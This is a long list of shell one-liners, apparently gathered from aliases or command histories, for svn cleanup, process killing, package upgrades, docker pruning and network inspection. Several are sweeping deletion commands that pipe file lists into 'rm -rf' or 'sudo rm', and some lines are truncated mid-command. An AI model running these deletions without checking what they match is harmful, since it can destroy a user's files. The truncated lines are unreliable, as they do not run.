svn status | grep ^\? | cut -c9- | xargs -d \\n rm -rv
svn status | grep ^\? | cut -c9- | xargs -d \\n rm -rf
svn status | grep ^\? | cut -c9- | xargs -d \\n rm -r
svn status | grep ^\? | cut -c9- | xargs -d \\\\n rm -r
svn status | grep ^\? | cut -c9- | xargs -I {} -d \\n rm -r {}
svn status | grep ^\! | sed s/\!// | xargs svn --force delete $1
svn status | grep ^? | sed 's/^.* /svn add /' | bash
svn status | grep ^? | awk '{print $2}' | xargs svn add
svn status | grep \! | awk '{print $2}' | xargs svn rm
svn status | grep M | sed -e 's/M //g' | xargs -J% svn revert %
svn status | grep ? | sed -e 's/? //g' | xargs -J% svn add %
svn status | grep ? | sed 's/?//' | xargs svn add
svn status | grep .orig | awk '{print $2}' | xargs rm -rf
svn status | grep .bak | awk '{print $2}' | xargs rm -rf
svn status | grep -v ^X | grep -v 'Performing status on external' | grep -v ^$
svn status | grep -v -E '^Performing' | grep -v -E '^X.*' | grep -v -E '^$'
svn status | grep '^\?' | sed -e 's/? *//' | sed -e 's/ /\\ /g'
svn status | grep '^\!' | sed 's/! *//' | xargs -I% svn rm %
svn status | grep '^D' | awk '{print $2}' | xargs svn revert
svn status | grep '^?' | awk '{print \$2}' | xargs svn add
svn status | grep '^?' | awk '{print $2}' | xargs rm -rf
svn status | grep '^!' | sed 's/! *//' | xargs -d '\n' svn delete --force
svn status | grep '^!' | awk '{print \$2}' | xargs svn delete
svn status | grep '^!' | awk '{print $2}' | xargs svn delete
svn status | grep '\?' | awk '{print $2}' | xargs svn add
svn status | grep '?' | sed 's/^.* /svn add /' | zsh
svn status | grep '?' | sed 's/^.* /svn add /' | bash
svn status | grep '?' | awk '{print $2}' | xargs svn add
svn status | grep '!' | sed 's/^.* /svn rm /' | bash
svn status | grep ! | sed -e 's/! //g' | xargs -J% svn remove %
svn status | grep ! | sed 's/!//' | xargs svn delete
svn status | awk '/^M|^A|^D/ { print }'
svn status --no-ignore | grep ^I | cut -c9- | xargs -d \\n rm -r
svn status --no-ignore | grep '^\?' | sed 's/^\?//' | xargs rm -rf
svn status --no-ignore | grep '^\?' | sed 's/^\? //' | xargs rm -rf
svn status --no-ignore | grep '^\?' | sed 's/^\? //' | xargs -Ixx rm -rf xx
svn stat | grep '^?' | sed -e 's/^\? *//' | xargs svn --force del
svn stat | grep '^!' | sed -e 's/^\! *//' | xargs svn --force del
svn stat | egrep '(^M|^A|^D)'
svn st |grep ? |awk '{print $2}' |xargs svn add
svn st |grep '^\?' | awk '{print \$2}' | xargs svn add
svn st |grep '^\!' | awk '{print \$2}' | xargs svn rm
svn st | grep ^[MDAR] | sed 's/.* //g' | tr \
svn st | grep ^? | sed 's/? //' | xargs svn add
svn st | grep ^? | cut -d ' ' -f 8 | xargs svn add
svn st | grep ^? | cut -c2- | xargs rm
svn st | grep ^? | cut -b9- | xargs svn add
svn st | grep ^! | sed 's/! //' | xargs svn rm --force
svn st | grep ^! | sed 's/! //' | xargs svn rm
svn st | grep \? | cut -c2- | xargs svn add
svn st | grep ? | sed s/\?//g | xargs svn add
svn st | grep '^\?' | awk '{print $2}' | xargs svn add
svn st | grep '^\!' | awk '{print $2}' | xargs svn rm
svn st | grep '^[M|D|A]' --depth files
svn st | grep '^[M|D|A]'
svn st | grep '^?' |awk '{print \$2}' | xargs svn add
svn st | grep '^?' | sed -e 's/\?[ ]*/svn add /g' | sh
svn st | grep '^?' | awk '{print $2}' | xargs svn add
svn st | grep '^?' | awk '{print $2}' | xargs rm -rf
svn st | grep '^?' | awk '{ print \$2 }' | xargs svn add
svn st | grep '^!' |awk '{print \$2}' | xargs svn rm --keep-local
svn st | grep '^!' | sed -e 's/\![ ]*/svn del /g' | sh
svn st | grep '^!' | awk '{print $2}' | xargs svn delete --force
svn st | grep '^!' | awk '{print $2}' | xargs svn --force delete
svn st | grep '^!' | awk '{ print \$2 }' | xargs svn delete
svn st | grep '^!' | awk '{ print $2 }' | xargs svn delete
svn st | grep 'D ' | cut -d ' ' -f 8 | xargs -i svn revert {}
svn st | grep '?' | sed 's/\?//' | xargs svn add
svn st | grep '?' | awk '{print $2}' | xargs svn add
svn st | grep '?' | awk '{print $2}' | xargs rm -rf
svn st | grep '!' | awk '{print $2}' | xargs svn delete --force
svn st | grep ! | sed s/\!//g | xargs svn rm
svn st | grep ! | second | xargs svn rm
svn st | egrep -v '^(X|$|Performing)'
svn st | egrep -v '^($|X |Performing)'
svn st | egrep '^C| C ' | awk '{print
svn st | egrep '(^\?)' | sed 's/^... *//' | grep -v .git
svn st -s | \egrep '^?' | awk '{for(i=1;i<=NF-1;i++)\$i=\$(i+1);NF-=1;print}' | xargs svn add
svn st -s | \egrep '^!' | awk '{for(i=1;i<=NF-1;i++)\$i=\$(i+1);NF-=1;print}' | xargs svn rm
svn log --xml | grep author | sort -u | perl -pe 's/.*>(.*?)<.*/$1 = /'
svn info | grep URL | cut -d' ' -f2 | pbcopy
svn info | grep -n '^URL:' | sed 's/^[0-9]*:URL: //' | tr '\n' ' '
svisor --extensions 'node|js|coffee|iced' --exec coffee
sudo virsh list | awk '{print \$2}' | tail -n+3 | xargs -n1 sudo virsh snapshot-revert --current
sudo virsh list | awk '{print \$2}' | tail -n+3 | xargs -n1 sudo virsh snapshot-create-as
sudo tcpdump -tnn -c 40 -i any | uniq -c | sort -nr | head -10
sudo systemsetup -setremotelogin on && echo asimpson@$(ifconfig | grep 'inet 1' | cut -c 6- | awk 'NR==2 {print $1}')
sudo systemctl stop httpd mysqld && sudo systemctl status httpd mysqld | grep -i --max-count=4 'httpd.service - Apache Web Server\|active:\|mariadb.service - MariaDB'
sudo systemctl status openvpn@SUSE-NUE | tail -10 | cut -b64-144 | tail -1
sudo systemctl status httpd mysqld | grep -i --max-count=4 'httpd.service - Apache Web Server\|active:\|mariadb.service - MariaDB'
sudo systemctl start httpd mysqld && sudo systemctl status httpd mysqld | grep -i --max-count=4 'httpd.service - Apache Web Server\|active:\|mariadb.service - MariaDB'
sudo systemctl restart httpd mysqld && sudo systemctl status httpd mysqld | grep -i --max-count=4 'httpd.service - Apache Web Server\|active:\|mariadb.service - MariaDB'
sudo softwareupdate -i -a; brew update; brew upgrade --all; brew cleanup; sudo composer global self-update; sudo composer global update; sudo composer global clear-cache; sudo npm install npm -g; sudo npm update -g; sudo npm cache clean; sudo pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U; sudo rm -rf ~/.pip/cache/; sudo gem update --system; sudo gem update; sudo gem cleanup; yarn global upgrade
sudo softwareupdate -i -a && brew update && brew upgrade && brew cleanup && brew cleanup -s && python3 /Users/springfield/my_apps/delete-spam-automation/run.py && npm update -g && pip3 install --upgrade pip && pip3 list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip3 install -U --user && conda install anaconda -y && conda update --all -y && conda clean -ay
sudo ps aux | grep java | grep -vE '(eclipse|grep)'
sudo pip3.8 list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 sudo pip3.8 install -U
sudo pip3 freeze — local | grep -v ‘^\-e’ | cut -d = -f 1 | xargs -n1 sudo pip3 install -U
sudo pip3 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 sudo pip3 install -U
sudo pip3 freeze --local | grep -v '^\-e' | cut -d = -f 1 | sudo xargs pip3 install -U
sudo pip2 freeze --local | grep -v '^\-e' | cut -d = -f 1 | sudo xargs pip2 install -U
sudo pip list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 sudo pip install -U
sudo pip install -U `pip freeze|cut -d= -f 1|grep -v matplotlib|grep -v numpy`
sudo pip install --upgrade pip; pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs pip install -U; brew update; brew upgrade; softwareupdate -i -a
sudo pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs sudo pip install --upgrade pip -U
sudo pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs pip install -U
sudo pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U
sudo pacman -Sgg | grep blackarch | cut -d' ' -f2 | sort -u
sudo pacman -S $(pacman -Ss | paste - - | fzf | awk
sudo ngrep -d 'en0' -t -q -W byline '^(GET|POST|PUT|DELETE) ' 'tcp and port 80'
sudo netstat -lntp | grep -v grep | grep -i 'listen' | grep -i -e VSZ -e
sudo netstat -anpl | grep :80 | awk {'print \$5'} | cut -d\
sudo netstat -alnp | grep -i list | grep -i tcp | sort
sudo nano $(echo $(fc -ln -1) | rev | cut -d\ -f 1 | rev)
sudo lxc-ls --fancy | grep '^ubu ' | tr -s ' ' | cut -d' ' -f 3
sudo lsof | grep 'DEL.*lib' | cut -f 1 -d ' ' | sort -u
sudo lsof | grep 'DEL.*lib' | cut -d ' ' -f 1 | sort -u
sudo lsof -Pni4 | awk 'NR==1 || /LISTEN/'
sudo lsof +c 15 | grep 'DEL.*lib' | cut -d ' ' -f 1 | sort -u
sudo ls -a | tail -n +3 | xargs -I {} sudo du -sh ./{} | sort -h
sudo kill `ps ax | grep 'coreaudiod' | grep -v grep | awk '{print $1}'`
sudo kill `ps aux|grep openconnect|grep -v grep|cut -c 10-15`
sudo kill `ps aux | grep ""wlan0"" | grep -v ""grep"" | ssc 2` 2>/dev/null; \
sudo kill `ps aux | grep ""dhclient"" | grep -v ""grep"" | ssc 2` 2>/dev/null"
sudo kill `ps -ax | grep 'coreaudiod' | grep 'sbin' |awk '{print $1}'`
sudo kill `ps -ax | grep 'coreaudiod' | grep 'sbin' | awk '{print $1}'`
sudo kill -9 \`ps auxwww | grep alles | grep sshd | pawk2\`
sudo kill -9 $(ps aux | grep stunnel | grep -v grep | awk '{print $2}')
sudo kill -9 $(ps aux | grep -i airtel | awk '{print $2}' | grep -v auto)
sudo journalctl --since=today | tac | sed -n '/-- Reboot --/{n;:r;/-- Reboot --/q;p;n;b r}' | tac
sudo iwconfig | grep ESSID | sed 's/ /</g' | sed 's/ESSID:\
sudo iptables -S | grep -P 'REJECT|DENIED|DENY'
sudo ip addr | grep -Eo 'inet (addr:)?([0-9]*\\.){3}[0-9]*' | grep -Eo '([0-9]*\\.){3}[0-9]*' | grep -v '127.0.0.1'
sudo ifconfig | grep cast | cut -d':' -f2 | cut -d' ' -f1
sudo ifconfig | grep -Eo 'inet (addr:)?([0-9]*\\.){3}[0-9]*' | grep -Eo '([0-9]*\\.){3}[0-9]*' | grep -v '127.0.0.1'
sudo ifconfig | grep -Eo 'inet (addr:)?([0-9]*\\.){3}[0-9]*' | grep -Eo '([0-9]*\\.){3}[0-9]*' | grep - v '127.0.0.1'
sudo ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'
sudo ifconfig | grep 'inet addr:' | cut -d: -f2 | cut -d\ -f1
sudo git status -s | grep '^\??' | grep -v '.gitignore' | cut -c 4- >> .gitignore
sudo fs_usage -e -f filesystem|grep -v CACHE_HIT|grep -v grep|grep open
sudo fs_usage -e -f filesystem|grep -v CACHE_HIT|grep -v grep|grep Users
sudo find . -type f -print0 | xargs -0 du -h | sort -hr | head -20
sudo find . -type f -path .git -prune | p4 -x - fstat 2>&1 > /dev/null | sed \'s/ -.*$//\' | xargs -P10 sudo rm -v
sudo du -hsx err.txt generated.file succ.txt | sort -rh | head -10 | ccze -A
sudo du -hsx err.txt generated.file succ.txt | egrep '([0-9][0-9][0-9]M|[0-9]G)' | sort -h
sudo du -a ~/ | sort -n -r | head -n 10 | ccze -A
sudo du -a /var | sort -n -r | head -n 10 | ccze -A
sudo dpkg -l |grep ^rc|awk '{print }' | xargs aptitude -y purge
sudo dpkg --get-selections|grep 'linux-image*'|awk '{print $1}'|egrep -v \
sudo dpkg --get-selections | grep deinstall | sed 's/\t\+.*//g' | xargs sudo dpkg --purge 2> /dev/null
sudo docker.io images -a --no-trunc | grep '^<none>' | awk '{print \$3}' | sudo xargs -r docker.io rmi
sudo docker-compose config | docker run -i funkwerk/compose_plantuml --link-graph | docker run -i think/plantuml -tpng | imgcat
sudo docker ps | cut -d\ -f 1 | tail +2 | xargs sudo docker kill
sudo docker ps -a | grep Exited | awk {'print $1'} | xargs docker rm
sudo docker ps -a | grep Exit | cut -d ' ' -f 1 | xargs sudo docker rm
sudo docker images | head -n 1 && sudo docker images | tail -n +2 | sort
sudo docker images | grep '<none>' | awk '{print $3}' | xargs sudo docker rmi -f
sudo docker images -a | grep none | awk '{print $3}' | xargs docker rmi
sudo docker image ls | head -n 2 | tail -n 1 | awk ""{print \$3}"")"
sudo dmidecode|perl -ne 'print if /0x(0100|0001)/ .. /0x(0200|0002)/'
sudo dkms install vboxhost/$(pacman -Q virtualbox|awk {'print $2'}|sed 's/\-.\+//') -k $(uname -rm|sed 's/\ /\//')
sudo bash -c 'yes | pacman -Sc && pacman -Qdtq | pacman -Rs - && yes | pacman-optimize'
sudo apt-get autoremove ; sudo apt-get clean ; dpkg -l |grep ^rc|awk '{print $2}' |sudo xargs dpkg -P
sudo /sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\\.){3}[0-9]*' | grep -Eo '([0-9]*\\.){3}[0-9]*' | grep -v '127.0.0.1'
sudo -H pip freeze — local | grep -v ‘^\-e’ | cut -d = -f 1 | xargs -n1 pip install -U
sudo $(cat $(readlink -f $HISTFILE) | tail -n2 | head -n1 | cut -d\; -f2-)
subscription-manager repos --list | grep 'Enabled: 1' -B 3 | grep 'Repo ID' | cut -d
subscription-manager repos --list | grep 'Enabled: 1' -B 3 | grep 'Repo ID' | awk '{ print $3 }'
stty -a | tr ';' '\n' | egrep 'rows|columns'
strings /dev/urandom | grep -o '[[:alnum:]]' | head -n 8 | tr -d '\n'; echo
strings /dev/urandom | grep -o '[[:alnum:]]' | head -n 30 | tr -d '\n'; echo
strings /dev/urandom | grep -o '[[:alnum:]]' | head -n 30 | tr -d '\n';
strings /dev/urandom | grep -o '[[:alnum:]]' | head -n 24 | tr -d '\n'; echo
strings /dev/urandom | grep -o '[[:alnum:]]' | head -n 12 | tr -d '\n'; echo
strings /dev/urandom | grep -o '[[:alnum:]]' | head -n 10 | tr -d '\n'; echo
stoken | tail -n 1 | tr -d '\n' | pbcopy
st | grep master.xml | sed 's/[\?!MRA] //g' | xargs touch
sst | grep '?' | cut -c5- | xargs svn add
ssq | grep -v '^对' | grep -v '^Performing' | grep -v '^$'
ssh_add_count=`ssh-add -l | wc -l`; [ $ssh_add_count > 0 ] || ssh-add ;ssh 172.20.1.3
ssh ubuntu@`sudo lxc-ls --fancy | grep '^ubu ' | tr -s ' ' | cut -d' ' -f 3`
ssh heat-admin@\$(nova list | grep controller-2 | awk '{print \$12}' | cut -d'=' -f2) -t 'sudo -i'
ssh heat-admin@\$(nova list | grep controller-1 | awk '{print \$12}' | cut -d'=' -f2) -t 'sudo -i'
ssh heat-admin@\$(nova list | grep controller-0 | awk '{print \$12}' | cut -d'=' -f2) -t 'sudo -i'
ssh heat-admin@\$(nova list | grep compute-1 | awk '{print \$12}' | cut -d'=' -f2) -t 'sudo -i'
ssh heat-admin@\$(nova list | grep compute-0 | awk '{print \$12}' | cut -d'=' -f2) -t 'sudo -i'
ssh `find-exo-hosts virt-db|ack -v pp|sort|head -1` -L 3307:localhost:3306
ssh `find-exo-hosts portal-db|ack -v pp|sort|head -1` -L 3309:localhost:3306
ssh `dig mx amazon.com | grep -v TCP | head -1 | awk
ssh \$(cat ~/.ssh/config | grep 'Host ' | awk '{print \$2}' | fzf)
squeue | head -1; squeue -u $USER |grep -v USER| sort -k 4
squeue -u ksb | grep ksb | grep -w R | wc -l
sq | grep v10 | sed -r -e 's/ +/ /g' | sort
sq | grep u00166 | sed -r -e 's/ +/ /g' | sort
sq | grep p10 | sed -r -e 's/ +/ /g' | sort
sq | grep 166 | sed -r -e 's/ +/ /g' | sort
spot info | egrep '^Artist:|^Track:|^Album:' --color=never
sort|uniq -c|sort -rn|head
sort) <(pacman -Qqg base base-devel | sort)) | sort -r -n | less -S"
sort ~/.bash_history | uniq -c | sort -rn | head -10
sort ~/.bash_history | uniq -c | sort -n | tail -n 10
sort | uniq -c | sort -rn | head
sort | uniq -c | sort -nr | tabit
sort | uniq -c | sort -nr | sed -e 's/^ *\([0-9]*\) /\1 /'
sort | uniq -c | sort -nr | more
sort | uniq -c | sort -nr | less
sort | uniq -c | sort -nr | head
sort | uniq -c | sort -n | tail
sort | uniq -c | sort -n | less -eir
sort | uniq -c | sort -n -r | head -n 10
sort | sc.pl | awk 'NF > 0' | sort -n
sort .bash_history | uniq -c | sort -nr | head -n 50
sort -n | uniq -c | sort -nr | less
snb | grep '^udp' | column -t | cut -c -$COLUMNS
snb | grep 'ESTAB' | column -t | cut -c -$COLUMNS
sithaque 'sudo tail -f -n 200 /usr/local/pgsql/data/pg_log/\`sudo ls -tr /usr/local/pgsql/data/pg_log/|tail -n 1\`' |ccze -A |grep -i select
sinfo --states=drain --noheader -N | awk '{print \$1}' | sort | uniq
sinfo --states=down --noheader -N | awk '{print \$1}' | sort | uniq
sift --no-group --no-line-number --no-color '^(package|type|}|\t)'
shuf -i 1-49 | head -n6 | sort -n | xargs
sha=\$(git log --oneline -1 | awk {'print \$1'}); echo \$sha | tr -d '\n' | pbcopy; echo SHA \$sha copied to clipboard
sh -c $(history | grep ssh | grep @ | awk '{$1=$2=$3=
sfood-graph | dot -Tps | ps2pdf - | xargf open
services 2>/dev/null | grep '\[ - \]' | awk '{print \$4}' ; initctl list | grep waiting
services 2>/dev/null | grep '\[ + \]' | awk '{print \$4}' ; initctl list | grep running
service cloudstack-agent status | tail -1 ; service cloudstack-management status | tail -1; chkconfig --list | grep cloudstack
seq 1 $(tput cols) | sort -R | spark | lolcat
sed -r 's/\.$//; s|^[^.]+$||; /^$/d'
sed -n 2p | cut -d'=' -f2 | sed -r 's/(.{1})(.{3})/00\1\/\2\//' |\
sed -n 's/func.*\(Test.*\)(.*/\1/p' | xargs | sed 's/ /|/g'
sed -n ""s|.*,\(.*\)</h3>|\1|p"""
sed -e 's/\(.*\(notice:\|info:\|err:\|warning:\).*\)/\1\n/'
sed -E -e 's/(ti|si)on|( |^)on/\2sean/g'
sed -E 's|$| \\\|' .env
sed 's|^|; |g'
sed 's|^|// |g'
sed 's|^|# |g'
sed 's|\x1b\[[;0-9]*m||g'
sed 's|\s\+| |g'
sed 's|<[^>]*>||g'
sed 's/|.*| - error: \(uncaughtException\|\[seneca\]\).*$/\n\n\x1b[1;4;45m\n&::\x1b[0;39;49m\n \x1b[31;1mENV:\x1b[39;49m/g'"
sed 's/.*=//' | sort | uniq -c | sort -nr
sed 's/ |---->COLUMN = / ______________________________________________________________________________________________________________________\n |---->COLUMN = /g' | \
sed 's%0/0%0%' | sed 's%[1-9]/0%1%' | sed 's%0/[1-9]%1%' | sed 's%[1-9]/[1-9]%2%'
sed ':x s/\(^\|\t\)\t/\1 \t/; t x' | column -ts$'\t' | less -SFX
sed $'s|\x1B\\[[0-9;]*[a-zA-Z]||g'
searchtext|fzy -l 25|extract_filepath_linenum|open_in_app
searchhere .|fzft|extract_filepath_linenum|open_in_app
scutil --dns | grep 'nameserver\[[0-9]*\]' | sort | uniq
screenfetch | grep RAM | sed -e s/RAM/:RAM/ | cut -f4-10 -d:
screen -ls | grep main && urxvt -name screen -e screen -x main || urxvt -name screen -e screen -R -S main
screen -ls | grep irssi && screen -x irssi || screen -S irssi irssi
screen -ls | grep Detached | cut -f1 -d .| xargs -i screen -S {} -X quit
screen -ls | grep Detached | awk '{print $1}' | xargs -i screen -X -S {} quit
screen -ls | grep -q irc && nice -n 17 screen -r -d irc || nice -n 17 screen -S irc irssi
screen -list|tail -n +2 | head -n -2|cut -f2
screen -D -RR `screen -ls | grep ached | head -n 1 | gawk '{print $1}'`
scontrol show jobid -d | /mnt/hds/proj/bioinfo/SCRIPTS/jobinfo.pl | grep '#\|RUNNING'
scontrol show jobid -d | /mnt/hds/proj/bioinfo/SCRIPTS/jobinfo.pl -u $USER | grep '#\|RUNNING'
safepaste | read test_variable || true
roc devices list --limit 10 | jq '.[] | .id' | tr -d '\
rm **/*.(err|out|log|pyc)
rm (*~|.*~|\#*|.\#*)
rifle $(find -L . \( -path '*/\.*' -o -fstype 'dev' -o -fstype 'proc' \) -prune -o -print 2> /dev/null | sed 1d | cut -b3- | fzf +m)
rg . --line-number --no-heading -t js | fzf --delimiter=: --nth 3.. | sed 's/\([^:]*:[^:]*\):.*$/\1/' | xargs code -g
rg 'TODO|FIXME|XXX|HACK'
rg '(TODO|FIXME|XXX|NOTE)'
reset; ps ax | egrep 'zeus\sslave' | cut -b 1-5 | while read pid; do kill \$pid; done && rm .zeus.sock
rename ' ' '' err.txt generated.file succ.txt | find err.txt generated.file succ.txt | xargs -i echo file {} > temp.txt | ffmpeg -safe 0 -f concat -i temp.txt -c copy output.mp4; rm temp.txt
rcup `ls ~/.dotfiles | grep tag- | sed 's/^tag-/-t /' | tr
rbenv install -l | grep -v - | tail -1 | tr -d ' '
rand | md5sum | base64 | cut -c -8
rand | md5sum | base64 | cut -c -24
rand | md5sum | base64 | cut -c -16
rake -T | peco | awk '{ print $2 }' | xargs rake
rails --version | grep 2.3 > /dev/null && script/console || rails console
qstat |tee >(grep gen2 -c) |tee >(grep gen3 -c) |tee >(grep gen4 -c)
qstat | tail -n +3 | grep -v QLOGIN | grep -v QRLOGIN
qstat | grep `whoami` | cut -d . -f 1 | xargs qps
qstat | grep GPU ; qstat | grep GPU | wc -l
qstat -u $USER -f | grep -e 'Job\ Id\|exec_host\|Job_Name'
qs | grep thk22 | wc | awk '{print \$1}'
qs | awk '{print \$8}' | sort | uniq
qnodes | grep -A2 '^rhea[0-9]\+' | grep 'state = free' | wc -l
qnodes | grep -A2 '^[0-9]\+' | grep 'state = free' | wc -l
python3 manage.py runserver `echo $(ifconfig | grep inet | tail -1 | cut -d ' ' -f2):9000`
python3 -q || $(\which python3|head -1) -q
python3 -m pip list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 python3 -m pip install -U --user
python3 -m pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 python3 -m pip install -U
python manage.py runserver `echo $(ifconfig | grep inet | tail -1 | cut -d ' ' -f2):9000`
pyenv versions | grep -Ev '^\*|system|^\s\s[2-3]'
pwsafe -E -p kdewallet|tr '\n' ' '|sed 's/ $//'|xclip
pwsafe -E -p gpg|tr '\n' ' '|sed 's/ $//'|xclip
pwgen -cnB 8 10 | while read PASS; do echo -n t; echo -n | md5sum | cut -f1 -d ; done
pwgen -CsB 26 1 | tr -d ' ' | tr -d '\n' | pbcopy
pwd|tr -d '\n'|xclip|xclip -o
pwd|tr -d '\n'|xclip|pwd
pwd | tr -d '\r\n' | pbcopy | echo '=> working directory copied to keyboard'
pwd | tr -d '\r\n' | pbcopy -selection clipboard | echo '=> Working directory copied to clipboard.'
pwd | tr -d '\n' | tr -d '\r' | pbcopy
pwd | tr -d '\n' | tee | pbcopy
pwd | rev | cut -d'/' -f1 | rev
pwd | rev | cut -d / -f 1 | rev
pushd /Users/jfd/Desktop/android-mail/mail;ant -f build/build.xml yall yclean ydebug | lolcat ;ant -f build/build.xml yclean | lolcat;./gradlew assembleDebug | lolcat;popd
pub upgrade --packges-dir --verbosity solver | grep 'inconsistent' -A 2 | sed -e 's/\ |//g'
pub get --packages-dir --verbosity solver | grep 'inconsistent' -A 2 | sed -e 's/\ |//g'
pt -G '\.(bb|bbappend|inc|conf)$'
psc -ef | grep java | grep `whoami` | ~/dev/scripts/colour.sh
ps | head -n1 && ps aux | grep -v grep | grep -i -e 'USER.*PID.*%CPU.*%MEM.*VSZ.*RSS TTY.*STAT.*START.*TIME COMMAND.*' -e
ps | head -1 && /bin/ps auxfh | sort -nr -k 4 | head
ps | head -1 && /bin/ps auxfh | sort -nr -k 3 | head
ps | grep subjobs.sh | awk '{print $1}' | xargs kill -9
ps | grep 'em ' | grep ${cur_tty} | grep -v grep
ps xaw -o state -o ppid | grep Z | grep -v PID | awk '{print $2}'
ps x | ack 'Emacs\ (-nw\ )?--daemon' | awk '{print \$1}' | xargs kill
ps x -o rss= | xargs | sed 's/ /\+/g' | bc
ps ux | grep '[C]hrome Helper (Renderer)' | grep -v extension-process | awk '{print
ps uaxww | grep -e 'jarvis2|tlgen|barista'
ps u | tr -s [[:space:]] | cut -f2 -d' ' | xargs kill
ps hax -o user | sort | uniq -c | sort -hr
ps fwax | grep -v agetty | grep -v httpd |grep -v nfsiod
ps ex | ag 'lein.*.repl' | grep -v 'ag lein' | cut -d ' ' -f1
ps eax | grep sleep | grep SERVER | grep -v grep
ps ax|grep manage.py|awk '{print $1}'|xargs kill -9
ps ax|/bin/grep [c]hrome|cut -c-6|xargs sudo renice -19
ps axwww | grep '\<ssh\> -f' | cut -d ' ' -f1 | xargs kill
ps axu | grep ruby | awk '{print $2}' | xargs kill -9
ps axu | grep node | awk '{print $2}' | sudo xargs kill -9
ps axj | tail -n +2 | egrep -v egrep | egrep -i
ps axh -F | fzf | awk '{print \$2}' | xargs kill
ps axf | grep memcache | grep -v grep | awk
ps ax |grep zcentral.js | grep conf/storage_ | while read PID rest; do echo kill \$PID; kill \$PID; done;
ps ax |grep zcentral.js | grep conf/router_ | while read PID rest; do echo kill \$PID; kill \$PID; done;
ps ax |grep zcentral.js | grep conf/both_ | while read PID rest; do echo kill \$PID; kill \$PID; done;
ps ax |grep zagent.js | grep conf/memcache_agent_ | while read PID rest; do echo kill \$PID; kill \$PID; done;
ps ax |grep zagent.js | grep conf/agent_ | while read PID rest; do echo kill \$PID; kill \$PID; done;
ps ax |grep xtweet_server.js | grep conf/app_server_ | while read PID rest; do echo kill \$PID; kill \$PID; done;
ps ax | head -n 1;ps ax | fgrep -v ' grep --color=auto ' | grep
ps ax | grep zwatchdog.js | grep -v grep | while read PID rest; do echo kill \$PID; kill \$PID; done;
ps ax | grep spring | cut -f1 -d' ' | xargs kill
ps ax | grep server_zync_daemon.sh | grep -v grep | while read PID rest; do echo kill \$PID; kill \$PID; done; kill_datanet_routers kill_datanet_storages
ps ax | grep irb | grep -v grep | awk '{print $1}'
ps ax | grep haproxy | grep -v grep | while read PID rest; do echo kill \$PID; kill \$PID; done;
ps ax | grep agent_zync_daemon.sh | grep -v grep | while read PID rest; do echo kill \$PID; kill \$PID; done; kill_datanet_agents
ps ax | grep -i ruby | awk '{ print $1 }' | xargs kill -9
ps ax | grep -i rails | awk '{ print $1 }' | xargs kill -9
ps ax | grep 'coreaudio[a-z]' | awk '{print \$1}' | xargs sudo kill -9
ps ax -o user | sort | uniq -c | sort -nr
ps aux|grep 'meteor\|max-old-space-size=\|json --port'
ps aux|grep '/work/tomcat-portal-old/tomcat-7.0.26' | awk '{print $2}'|xargs sudo kill -9
ps aux|awk 'NR>1'|sort -k 3nr|head
ps aux| grep '/work/tomcat-portal-new' | awk '{print $2}'|xargs sudo kill -9
ps aux| grep '/work/program/tomcat-umeng' | awk '{print $2}'|xargs sudo kill -9
ps auxw|grep -v $USER|sort -k 2|more
ps auxwww|grep java|grep -v IntelliJ|grep -v grep
ps auxwww | grep ssh | grep kzsu | perl -na -e 'print \
ps auxww | sort | grep -v root | more
ps auxww | grep -v grep | grep -v $script | grep
ps auxww 1 | sed '1q' ; ps auxww | grep -v grep | grep -i
ps auxw | head -n1 ; ps auxw | grep -v grep | grep
ps auxw | head -1; ps auxw | sort -rn -k4 | head -3
ps auxf | head -n 1 && ps auxf | sort -nr -k 4 | head -10
ps auxf | head -n 1 && ps auxf | sort -nr -k 3 | head -10
ps auxf | grep dgautam | sort -nr -k 4 | head
ps aux |grep 'puma' | grep -v grep | awk '{ print \
ps aux |grep 'puma' | grep -grepv grep | awk '{ print \
ps aux |ack 'ssh xmldev' |awk '{print \$2}' |xargs kill
ps aux |ack 'ssh blackhawk' |awk '{print \$2}' |xargs kill
ps aux | tail -n +2 | peco | awk
ps aux | sort -nk +4 | grep chrome | perl -p -e
ps aux | percol | awk '{ print \$2 }' | xargs kill -9
ps aux | percol | awk '{ print $2 }' | xargs kill -9
ps aux | percol | awk '{ print $2 }' | xargs kill
ps aux | percol | awk '{ print $2 }' | echo
ps aux | peco | awk '{print \$2}' | xargs kill -9
ps aux | peco | awk '{ print \$2 }' | xargs kill -9
ps aux | peco | awk '{ print \$2 }' | xargs kill
ps aux | peco | awk '{ print $2 }' | xargs kill
ps aux | head -n1; ps aux | fgrep -v grep | fgrep
ps aux | head -n 1; ps aux | grep -v grep | grep -i
ps aux | head -n 1; ps aux | grep -v grep | grep $1
ps aux | head -n 1; ps aux | grep -v grep | grep
ps aux | head -n 1 && ps lax | grep -v grep | grep -i
ps aux | head -1; ps aux | sort -rn +3 | head -10
ps aux | head -1; ps aux | sort -rn +2 | head -10
ps aux | head -1; ps aux | grep -v grep | grep
ps aux | head -1 && ps aux | sort -rnk4 | head
ps aux | head -1 && ps aux | sort -rnk3 | head
ps aux | head -1 && ps aux | grep -v grep | grep
ps aux | grep zeus | grep -v grep | awk
ps aux | grep tomcat | fawk 2 | xargs kill -9
ps aux | grep tomcat | awk '{print \$2}' | xargs kill -9
ps aux | grep spring | awk '{print $2}' | xargs kill -9
ps aux | grep spork | grep -v grep | awk
ps aux | grep sidekiq | awk '{print \$2}' | xargs kill -9
ps aux | grep rails | grep -v grep | awk
ps aux | grep puma | grep -v color | awk
ps aux | grep protobuf/im_push_handler | awk '{print \$2}' | xargs kill -9
ps aux | grep protobuf/im_message_handler | awk '{print \$2}' | xargs kill -9
ps aux | grep php | awk '{print $1}'|xargs kill -9
